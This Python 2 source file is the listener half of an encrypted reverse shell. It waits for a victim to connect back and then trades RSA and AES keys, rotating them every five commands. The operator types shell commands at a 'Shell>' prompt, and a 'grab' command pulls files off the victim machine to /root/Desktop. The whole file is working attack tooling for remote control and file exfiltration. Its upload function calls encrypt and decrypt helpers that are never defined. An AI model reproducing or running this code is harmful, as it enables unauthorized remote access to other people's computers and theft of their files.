import socket # for building TCP connection
import os # needed for file operation

import random
import string

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES


# function to encrypt the AES key and counter with target RSA public keyy
# -> AES key will be used for further symmetric encryption
def encryptAESKey(aes_key, client_public_key):
    encryptor = RSA.importKey(client_public_key)
    encriptedData=encryptor.encrypt(aes_key, 0)
    return encriptedData[0]

# function to encrypt message
def encryptMessage(message, aes_key, counter):
    encrypto = AES.new(aes_key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

# function to decrypt a received AES encrypted message
def decryptMessage(message, aes_key, counter):
    decrypto = AES.new(aes_key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message)

# funcction to receive a file from the client
def transfer(conn, command, aes_key, aes_counter):
    conn.send(encryptMessage(command, aes_key, aes_counter))
    # create placeholder file
    f = open('/root/Desktop/filex.xy', 'wb')

    # infinite loop and store received data into our placeholder
    # break loop at file end (Done) or if it does not exist
    print 'receiving ...'
    while True:
        bits = decryptMessage(conn.recv(1024), aes_key, aes_counter)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed'
            f.close()
            break
        f.write(bits)


# function to transfer / send a file to our attack machine
def upload(s, path, aes_key, aes_counter):
    if os.path.exists(path): # verify if request file exists
        # notify client to receive a file
        s.send(encrypt('upload', aes_key, aes_counter))


        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            #s.send(encrypt(packet, aes_key, aes_counter))
            s.send(packet)
            packet = f.read(1024)

        #s.send(encrypt('DONE', aes_key, aes_counter))
        s.send('DONE')

        f.close()
        print 'file upload done ..'

        filepath = decrypt(s.recv(1024), aes_key, aes_counter)
        print 'file path: ' + filepath

    else: # file does not exist
        print 'Unable to find out the file'


def createAESKey():
	# generate AES key
    aes_key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(32))
    print "Generated AES Key " + str(aes_key)
    return aes_key

def createAESCounter():
	# generate AES counter
    aes_counter = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(16))
    print "Generated AES Counter " + str(aes_counter)
    return aes_counter


# function which manages connection and communcation stuff
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
    # we set a flag to prevent this
    # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.100.187", 8080))
    s.listen(1) # listen for single connection
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept() # addr -> IP:Port
    print 'We got a connection from: ', addr

    client_RSA_public_key = conn.recv(1024)
    print 'client key:'
    print client_RSA_public_key

    # after TCP handshake we creates our AES key for further communication
    # generate AES key and send to client
    aes_key = createAESKey()
    conn.send(encryptAESKey(aes_key, client_RSA_public_key))
    # generate AES counter and send to client
    aes_counter = createAESCounter()
    conn.send(encryptAESKey(aes_counter, client_RSA_public_key))
    # command counter - after x commands we will create new AES key+counter
    command_counter = 0

    while True:
        command = raw_input("Shell> ")
        command_counter = command_counter + 1

        if command_counter >= 5:
            print 'we have to change the key ...'
            conn.send(encryptMessage('change_key', aes_key, aes_counter))
            # create new AES key and send RSA encrypted to client
            aes_key = createAESKey()
            #necrypted_key = encryptAESKey(aes_key, client_RSA_public_key)
            conn.send(encryptAESKey(aes_key, client_RSA_public_key))
            # create new AES counter and send RSA encrypted to client
            aes_counter = createAESCounter()
            #encrypted_counter = encryptAESKey(aes_counter, client_RSA_public_key)
            conn.send(encryptAESKey(aes_counter, client_RSA_public_key))
            # reset command counter
            command_counter = 0

        # we want to terminate the connection
        if 'terminate' in command:
            conn.send(encryptMessage('terminate', aes_key, aes_counter))
            conn.close() # close the connection with host
            break

        # if we receive grab keyword from user input, then this is an indicator
        # for file transfer operation
        #
        # grab formula is grab*<file path>
        # Example: grab*C:\Users\XY\Desktop\photo.jpg
        elif 'grab' in command:
            transfer(conn, command, aes_key, aes_counter)

        # we did not enter a command
        elif command == '':
            # send 'random' command (in that case whoami) to not break the shell
            conn.send(encryptMessage('whoami', aes_key, aes_counter))
            print decryptMessage(conn.recv(1024), aes_key, aes_counter)

        else:
            # send command
            conn.send(encryptMessage(command, aes_key, aes_counter))
            print decryptMessage(conn.recv(1024), aes_key, aes_counter)

def main():
    connect()

main()
